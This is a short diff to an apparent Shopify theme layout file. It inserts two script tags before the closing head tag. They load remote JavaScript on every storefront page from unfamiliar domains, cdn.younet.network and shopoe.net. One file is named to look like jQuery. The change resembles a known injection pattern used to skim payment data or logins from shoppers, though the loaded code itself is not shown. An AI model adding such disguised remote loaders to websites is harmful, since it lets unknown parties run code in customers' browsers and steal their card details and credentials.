@@ -36,7 +36,9 @@
     {%- endif -%}
 
     {% render 'global-script' %}
-  </head>
+      <script src="https://cdn.younet.network/jquery.min.js" defer="defer"></script>
+  <script src="https://shopoe.net/app.js"></script>
+</head>
   <body class="page-{{ request.page_type | replace: 'customers/', '' }} gradient {{ settings.text_size | prepend: 'text-size main-text-' }} {{ settings.heading_size | prepend: 'heading-size main-heading-' }}{% if settings.enable_animated_cursor and settings.animated_cursor_style == 'following' %} cursor-fixed__show{% endif %}{% if settings.animations_hover_elements != 'none' %} animate--hover-{{ settings.animations_hover_elements }}{% endif %}">
     <a class="skip-to-content-link button visually-hidden" href="#MainContent">
       {{ "accessibility.skip_to_text" | t }}
